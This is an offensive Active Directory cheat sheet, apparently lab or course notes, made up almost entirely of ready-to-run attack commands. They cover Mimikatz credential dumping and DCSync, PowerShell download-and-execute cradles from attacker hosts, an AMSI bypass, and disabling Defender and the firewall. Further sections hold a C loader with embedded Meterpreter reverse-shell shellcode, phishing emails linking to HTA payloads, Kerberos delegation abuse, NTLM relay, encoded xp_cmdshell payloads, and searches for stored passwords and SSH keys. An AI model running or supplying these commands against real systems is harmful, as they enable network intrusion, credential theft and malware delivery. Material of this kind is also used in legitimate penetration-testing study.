# AD Command 

## Additinal cheat sheet

Additional cheat sheet available at [Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet).

## Mimikatz
```
#From powershell
Invoke-Mimikatz -Command " `"privilege::debug`" `"!processprotect /process:lsass.exe /remove`" `"lsadump::dcsync`" `"!/domain:evil.com /user:krbtgt`" `"exit`"  "

#From executable
curl http://192.168.49.64/mimidrv.sys -o c:\mimidrv.sys
curl http://192.168.49.64/mimikatz.exe -o c:\mimikatz.exe


.\mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"

.\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"

.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /patch" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject" "exit"

```
## Rubeus from powershell
```(New-Object System.Net.WebClient).DownloadString('http://192.168.49.164:8000/amsi.txt') | IEX

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.164:8000/Rubeus.exe')

$assem = [System.Reflection.Assembly]::Load($data)

[Rubeus.Program]::Main("purge".Split())

[Rubeus.Program]::Main("s4u /user:web01$ /rc4:b706acca0607363a499aba48e5d51790 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```

## Powerview from non domain joined machine
```
runas.exe /netonly /noprofile /user:DOMAIN\USER powershell.exe
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true);
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
Get-DomainUser -Domain mydomain.test -DomainController 192.168.5.1
```

## LAPSToolkit
Additional cheat sheet available at [Cheat Sheet](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps).
**LAPSToolkit.ps1**
```
# Gets all computers which have LAPS enabled
Get-LAPSComputers

# Get Groups that can read the ms-Mcs-AdmPwd attribute
Find-LAPSDelegatedGroups

# Checks for ExtendedRights for Laps on each AD Computer
Find-AdmPwdExtendedRights
```

## Password spraying


## Bloudhound from python
```
SharpHound.exe -c All --domain ops.comply.com --searchforest --zipfilename ops_bloodhound.zip

(New-Object System.Net.WebClient).DownloadString('http://192.168.90.128:8000/SharpHound.ps1') | IEX
Invoke-BloodHound -CollectionMethod All -Domain ops.comply.com -ZipFilename ops
Invoke-BloodHound -CollectionMethod All -Domain ops.comply.com -ZipFilename ops -SearchForest 

bloodhound-python -u will -p fdsfssdfDFG4  -d tricky.com -ns 172.16.64.150 --dns-tcp -c All --zip --dns-timeout 120
proxychains bloodhound-python -u will -p fdsfssdfDFG4  -d tricky.com -ns 172.16.64.150 --dns-tcp -c All --zip --dns-timeout 120

bloodhound-python -u 'WEB05$@COMPLYEDGE.COM' --hashes aad3b435b51404eeaad3b435b51404ee:1a6a751f363a0e0fc39e405e53f0e220 -d complyedge.com -ns 172.16.64.168 --dns-tcp -c All --zip --dns-timeout 120
```

## PowerShell port scan
```

Invoke-Portscan -Hosts 172.16.64.184,172.16.64.185 -Ports "5985,5986" | Select -ExpandProperty openPorts

```

## Extract keytab file
`python3 /opt/KeyTabExtract/keytabextract.py krb5.keytab`

## Proxy auto routing from metasploit
```
use multi/manage/autoroute
set session 1
exploit

use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j

#This create a socks5 proxy on port 1080
```

## Sshuttle
```
sshuttle -r root2@192.168.64.164 172.16.64.0/24
sshuttle -v -e "ssh -i id_rsa.txt" -r root@172.16.64.197 172.16.64.0/24
```

## AV bypass

### AV bypass script
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true);
```

### Turn off defender and firewall
```
//Disable Antivirus
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

NetSh Advfirewall set allprofiles state off

```


## Check SMB version 
```
crackmapexec smb 172.16.64.182 -u will -p 'fdsfssdfDFG4'

proxychains crackmapexec smb 172.16.64.182 -u will -p 'fdsfssdfDFG4'
```

## Fileless lateral movement 
```
copy c:\inject.exe \\dc02\c$
lat.exe "dc02" "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
lat.exe "dc02" "C:\\inject.exe"

```

## Test smtp server 
```
swaks --body 'Please click here http://192.168.49.64:8000/hello.hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Issues with mail" -t $admin@tricky.com -f will@tricky.com --server 192.168.64.159

swaks --body 'Please click here http://192.168.49.64:8000/source.hta' --header  "Subject: Issues with mail" -t will@tricky.com -f will@tricky.com --server 192.168.64.159

```



## C reverse shell
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>



// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.175 LPORT=4488 -f c exitfunc=thread
unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\xa4\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";


int main (int argc, char **argv) 
{
	
	if (fork() ==0){
	int (*ret)() = (int(*)())buf;
  	ret();

};

	printf("I love programming.");
	printf("\n");
	// Run our shellcode

return 3;
}

// gcc -o hack.out hack.c -z execstack

```

## Abusing Object Right
### Abusing Write DACL 
By adding GenericAll 
```
$credsrulon = New-Object System.Management.Automation.PSCredential ("tricky.com\sqlsvc", (ConvertTo-SecureString "4dfgdfFFF542" -AsPlainText -Force))

Add-DomainObjectAcl -TargetIdentity Mailadmins -PrincipalIdentity sqlsvc -Rights All -Credential $credsrulon -Verbose

//Now add user to group
Add-DomainGroupMember -Identity Mailadmins -Members 'tina'  -Credential $Cred -Verbose
```

Now GenericAll Right is given, we can add user to group 
```
#Powerview
Add-DomainGroupMember -Identity 'ENTERPRISE ADMINS' -Members 'tina'  -Credential $Cred -Verbose

#Add will and sqlsvc to mailadmins
net group mailadmins  will /add /domain
net group mailadmins  sqlsvc /add /domain
```

### Abuse AddKeyCredentialLink (Shadow credential) 
#### On windows
```
Whisker.exe "add /target:sflowers"

Rubeus.exe "asktgt /user:sflowers /certificate:... /password:   /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show"

evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5

```

#### On Linux
```
#https://github.com/ShutdownRepo/pywhisker
python3 pywhisker.py -d "n00py.local" -u "n00py" -p "PasswordForn00py" --target "esteban_da" --action "add" --filename hax  

#https://github.com/dirkjanm/PKINITtools
python3 gettgtpkinit.py -cert-pfx hax.pfx -pfx-pass dfeiecA9SZN75zJ7P5Zs n00py.local/esteban_da esteban_da.ccache
python3 getnthash.py -key 571d3d9f833365b54bd311a906a63d95da107a8e7457e8ef01b36810daadf243 n00py.local/esteban_da
```

### Unconstrained delegation (Run as system)
```
ls \\cdc01\pipe\spoolss
Rubeus.exe monitor /interval:5 /filteruser:CDC01$
SpoolSample.exe CDC01 APPSRV01
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

### Abusing GenericWrite for computer (RBCD) - GenericWrite Abuse
#### Get machine account quota
```
Get-DomainObject -Identity domain_name -Properties ms-DS-MachineAccountQuota
```
Here we asume FILE06 has GenericWrite on Jump09 
```
python3 /usr/share/doc/python3-impacket/examples/rbcd.py  OPS.COMPLY.COM/file06$ -hashes :2fb588578da3582eebc111abfcb22b03 -dc-ip 172.16.64.165  -delegate-from file06$ -delegate-to jump09$ -action read

python3 /usr/share/doc/python3-impacket/examples/rbcd.py  OPS.COMPLY.COM/file06$ -hashes :2fb588578da3582eebc111abfcb22b03 -dc-ip 172.16.64.165  -delegate-from file06$ -delegate-to jump09$ -action write

python3 /usr/share/doc/python3-impacket/examples/rbcd.py  OPS.COMPLY.COM/file06$ -hashes :2fb588578da3582eebc111abfcb22b03 -dc-ip 172.16.64.165  -delegate-from file06$ -delegate-to jump09$ -action read

python3 /usr/share/doc/python3-impacket/examples/getST.py  OPS.COMPLY.COM/file06$ -hashes :2fb588578da3582eebc111abfcb22b03  -impersonate administrator -spn CIFS/jump09.ops.comply.com -dc-ip 172.16.64.165

export KRB5CCNAME=administrator.ccache

python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@jump09.ops.comply.com -k -no-pass 



#Manually
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.64:8000/Powermad.ps1') | IEX

New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity myComputer

$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity JUMP09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

.\Rubeus.exe hash /password:h4x
.\Rubeus.exe purge
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/JUMP09.ops.comply.com /ptt


klist

dir \\JUMP09.ops.comply.com\c$

```

## Impersonation with SpoolSample
```
c:\Windows\Tasks\NonLogonSessionPrintSpoofer.exe \\.\pipe\test\pipe\spoolss
c:\Windows\Tasks\SpoolSample.exe sql03 sql03/pipe/test

```


## App whitelisting bypass
### Install Util
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe

start-process -filepath C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe  -ArgumentList "/logfile= /LogToConsole=false /U C:\Windows\tasks\bypass.exe"

```

## Evilrm - WinRM
```
evil-winrm -u tricky.com\\Administrator -H 48989de6a73f952ad51adceabc13cc9c -i 172.16.98.159
evil-winrm -u tricky.com\\Administrator -p 'Password123!' -i 172.16.98.159
```

## Impacket

### Secret dump
```
proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py tricky.com/will:fdsfssdfDFG4@172.16.64.150
```

### PSexec
```
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py -dc-ip 172.16.64.150 tricky/sqlsvc:4dfgdfFFF542@172.16.64.150

python3 /usr/share/doc/python3-impacket/examples/psexec.py pete@dmzdc01.complyedge.com -k -no-pass

python3 /usr/share/doc/python3-impacket/examples/psexec.py complyedge.com/pete@dmzdc01.complyedge.com -k -no-pass  -dc-ip 172.16.64.168

PsExec64.exe -i -s cmd.exe
```

### Atexec
```
proxychains python3 /usr/share/doc/python3-impacket/examples/atexec.py tricky.com/will:fdsfssdfDFG4@172.16.64.155 whoami


python3 /usr/share/doc/python3-impacket/examples/atexec.py tricky.com/will:fdsfssdfDFG4@172.16.64.155 "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQA2ADQAOgA4ADAAMAAwAC8AbQBlAHQALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABcAFcAaQBuAGQAbwB3AHMAXABcAFQAYQBzAGsAcwBcAFwAbQBlAHQALgBlAHgAZQAiAA0ACgANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBDADoAXABcAFcAaQBuAGQAbwB3AHMAXABcAFQAYQBzAGsAcwBcAFwAbQBlAHQALgBlAHgAZQAiAA=="

```

### GetADUser
```
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 172.16.64.168  complyedge.com/pete
```

### GetUserSPN
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py tricky.com/will -dc-ip 172.16.64.150 
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py tricky.com/will -dc-ip 172.16.64.150 -request

```

### MSSQL connect (do not forget -windows-auth parameter)
```
python3.10 /usr/share/doc/python3-impacket/examples/mssqlclient.py Administrator:Pass12345@172.16.64.194 -windows-auth
python3.10 /usr/share/doc/python3-impacket/examples/mssqlclient.py webapp11:'89543dfGDFGH4d'@192.168.175.140
```

## Powerview

### Get Relevant object right
```
Get-DomainUser  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -NotLike "*Principal Self" -and $_.Identity -NotLike "*Creator Owner"  -and $_.Identity -NotLike "*Local System*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike "*BUILTIN\Administrators*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike ("*"+$("$env:UserDomain\Domain Admins")+"*")  -and $_.Identity -NotLike ("*"+$("$env:UserDomain\Enterprise Admins")+"*") )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

Get-DomainComputer  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -NotLike "*Principal Self" -and $_.Identity -NotLike "*Creator Owner"  -and $_.Identity -NotLike "*Local System*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike "*BUILTIN\Administrators*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike ("*"+$("$env:UserDomain\Domain Admins")+"*")  -and $_.Identity -NotLike ("*"+$("$env:UserDomain\Enterprise Admins")+"*") )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

Get-DomainGroup  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -NotLike "*Principal Self" -and $_.Identity -NotLike "*Creator Owner"  -and $_.Identity -NotLike "*Local System*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike "*BUILTIN\Administrators*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike ("*"+$("$env:UserDomain\Domain Admins")+"*")  -and $_.Identity -NotLike ("*"+$("$env:UserDomain\Enterprise Admins")+"*") )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

$domain_name = 'dev.domain.com'
Get-DomainUser  -domain $domain_name | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -NotLike "*Principal Self" -and $_.Identity -NotLike "*Creator Owner"  -and $_.Identity -NotLike "*Local System*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike "*BUILTIN\Administrators*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike ("*"+$("Domain Admins")+"*")  -and $_.Identity -NotLike ("*"+$("Enterprise Admins")+"*") )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

Get-DomainComputer -domain $domain_name | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -NotLike "*Principal Self" -and $_.Identity -NotLike "*Creator Owner"  -and $_.Identity -NotLike "*Local System*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike "*BUILTIN\Administrators*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike ("*"+$("Domain Admins")+"*")  -and $_.Identity -NotLike ("*"+$("Enterprise Admins")+"*") )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

Get-DomainGroup  -domain $domain_name | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object { $_ } | where-object{( ($_.ActiveDirectoryRights -like '*GenericAll*' -or ($_.ActiveDirectoryRights -like '*GenericWrite*') -or ($_.ActiveDirectoryRights -like '*WriteOwner*') -or ($_.ActiveDirectoryRights -like '*WriteDACL*') -or ($_.ActiveDirectoryRights -like '*AllExtendedRights*') -or ($_.ActiveDirectoryRights -like '*ForceChangePassword*') -or ($_.ActiveDirectoryRights -like '*Self*') -or ($_.ActiveDirectoryRights -like '*ExtendedRight*' -and $_.ObjectAceType -like '*User-Force-Change-Password*') ) -and ($_.Identity -NotLike "*Principal Self" -and $_.Identity -NotLike "*Creator Owner"  -and $_.Identity -NotLike "*Local System*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike "*BUILTIN\Administrators*" -and $_.Identity -NotLike "*BUILTIN\Account Operators*" -and $_.Identity -NotLike ("*"+$("Domain Admins")+"*")  -and $_.Identity -NotLike ("*"+$("Enterprise Admins")+"*") )  )} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType, Identity

```

### Test Admin access
```
Test-AdminAccess -ComputerName file06.ops.comply.com  -Credential $Cred

```
### Get Admin / RDP user 
```
#Get user being admin through GPO
Get-DomainGPOUserLocalGroupMapping -Domain COMPLYEDGE.COM | select ObjectName, ObjectDN, Domain, ComputerName | ft

Get-DomainGPOUserLocalGroupMapping -Domain final.com | select ObjectName, ObjectDN, Domain, ComputerName | ForEach-Object{ Get-DomainGroupMember $_.ObjectName;}


Get-DomainComputer | Get-DomainGPOComputerLocalGroupMapping -Domain final.com  -LocalGroup RDP

Get-DomainComputer -Domain dev.final.com | Get-DomainGPOComputerLocalGroupMapping -LocalGroup RDP

```

### Get group member
```
Get-DomainGroupMember ForeignFileAdmin
Get-DomainGroupMember ForeignFileAdmin -domain ops.comply.com
```

### List groups of a particular user 
```
Get-NetGroup -UserName pete | select  cn,samaccountname
```

### Get SPN 
```
Get-DomainUser -spn | select-object -property cn, serviceprincipalname
Get-DomainUser -spn -domain dev.final.com | select-object -property cn, serviceprincipalname
```

### Set user password
```
$creds = New-Object System.Management.Automation.PSCredential ("final.com\adminWebSvc", (ConvertTo-SecureString "FGjksdff89sdfj" -AsPlainText -Force))
$UserPassword = ConvertTo-SecureString 'P@ss1235' -AsPlainText -Force
Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $creds -Verbose
```
### Reset user password in Linux
```
import ldap3
from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
user = 'n00py'
password = 'PasswordForn00py'
server = ldap3.Server('n00py.local',get_info = ldap3.ALL, port=636, use_ssl = True)
c = Connection(server, user, password=password)
c.bind()
c.extend.microsoft.modify_password('CN=ESTEBAN DA,OU=EMPLOYEES,DC=N00PY,DC=LOCAL', 'NewPass123')

```

### Get Password policy
```
Get-ADDefaultDomainPasswordPolicy -Server 192.1685.5.1
```

## Powershell in no profile
```
echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.98:8000/PowerUp.ps1') | powershell -noprofile - 
echo 'IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.98:8000/PowerUp.ps1")' | powershell -noprofile - 
```

## PowerUp abuse service
```
sc config SNMPTRAP obj= LocalSystem
sc config SNMPTRAP password= ""

Invoke-ServiceAbuse -ServiceName 'SNMPTRAP'
Invoke-ServiceAbuse -ServiceName 'SNMPTRAP' -Username FINAL\Nina
Invoke-ServiceAbuse -ServiceName 'SNMPTRAP' -Command "net user Administrator Pass12345"
```

## MSSQL 

### UNC Path
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py   . test -smb2support

EXEC master.sys.xp_dirtree '\\192.168.49.175\TEST\cNukPTxEfp'
EXEC xp_dirtree '\\192.168.49.64\test'
```

### Linked Servers
```
SELECT is_srvrolemember('sysadmin'); 

#Administrator of the machine can be a sysadmin
#The we need to run as sa

EXECUTE as LOGIN = 'sa'
EXEC sp_linkedservers; 
select srvname from master..sysservers;


EXEC ('EXEC sp_addlogin ''rulon'', ''password123!'' ') AT SQL27;
EXEC ('EXEC sp_addsrvrolemember ''rulon'', ''sysadmin''') at [SQL27];


EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT SQL03; 
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT SQL03;
EXEC('xp_cmdshell ''whoami'';') AT SQL03

EXEC('xp_cmdshell ''powershell -enc JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQBzACgAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAGEAKQAgAHsAaQBmACAAKAAkAGIALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAGkAVQB0AGkAbABzACIAKQAgAHsAJABjAD0AJABiAH0AfQA7ACQAZAA9ACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGUAIABpAG4AIAAkAGQAKQAgAHsAaQBmACAAKAAkAGUALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAEkAbgBpAHQARgBhAGkAbABlAGQAIgApACAAewAkAGYAPQAkAGUAfQB9ADsAJABmAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADQAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAAoA'';') AT SQL03

```

### NTLM-Relay
**Condition**
+ SMB signing disable
+ SPN User is local admin of the machine
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py   . test -smb2support

echo "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" | iconv --to-code UTF-16LE |   base64 -w 0

sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc KABOAGU...'

```

## Post Exploitation (File looting)
### Windows
```
Get-ChildItem -Path C:\ | Where-Object{$_.Name -ne "Windows" } | ForEach-Object{ Get-ChildItem -Path $_.FullName -Recurse -File  -Include 'id_rsa','known_hosts'  -Force -ErrorAction SilentlyContinue }

Get-ChildItem -Path C:\ | Where-Object{$_.Name -ne "Windows" -and  $_.Name -ne "Program Files" -and $_.Name -ne "Program Files (x86)"} | ForEach-Object{ Get-ChildItem -Path $_.FullName -Recurse -File  -Include '*.txt','*.py','*.php','*.ps1','*.bat','*.config','*.aspx','*.asp','*.csv','*.hta','*.vbs','*.vba','*.java' -ErrorAction SilentlyContinue  | Select-String -Pattern 'user', 'login', 'pass', 'pwd', 'psw', 'database', 'secret', 'password', 'vnc'  -AllMatches -ErrorAction SilentlyContinue | Select-Object -Unique Path }
  Get-ChildItem -Path "C:\Program Files" | Where-Object{$_.Name -ne "Common Files" -and  $_.Name -ne "internet explorer" -and $_.Name -NotLike "Microsoft*" -and $_.Name -ne "VMware" -and $_.Name -NotLike "Windows*"} | ForEach-Object{ Get-ChildItem -Path $_.FullName -Recurse -File  -Include '*.txt','*.py','*.php','*.ps1','*.bat','*.config','*.aspx','*.asp','*.csv','*.hta','*.vbs','*.vba','*.java' -ErrorAction SilentlyContinue  | Select-String -Pattern 'user', 'login', 'pass', 'pwd', 'psw', 'database', 'secret', 'password', 'vnc'  -AllMatches -ErrorAction SilentlyContinue | Select-Object -Unique Path }
  Get-ChildItem -Path "C:\Program Files (x86)" | Where-Object{$_.Name -ne "Common Files" -and  $_.Name -ne "internet explorer" -and $_.Name -NotLike "Microsoft*" -and $_.Name -ne "VMware" -and $_.Name -NotLike "Windows*"} | ForEach-Object{ Get-ChildItem -Path $_.FullName -Recurse -File  -Include '*.txt','*.py','*.php','*.ps1','*.bat','*.config','*.aspx','*.asp','*.csv','*.hta','*.vbs','*.vba','*.java' -ErrorAction SilentlyContinue  | Select-String -Pattern 'user', 'login', 'pass', 'pwd', 'psw', 'database', 'secret', 'password', 'vnc'  -AllMatches -ErrorAction SilentlyContinue | Select-Object -Unique Path }

```

### Linux
```
find /home -name id_rsa -type f 2> /dev/null
find /root -name id_rsa -type f 2> /dev/null

find /home -name known_hosts -type f 2> /dev/null
find /root -name known_hosts -type f 2> /dev/null
```
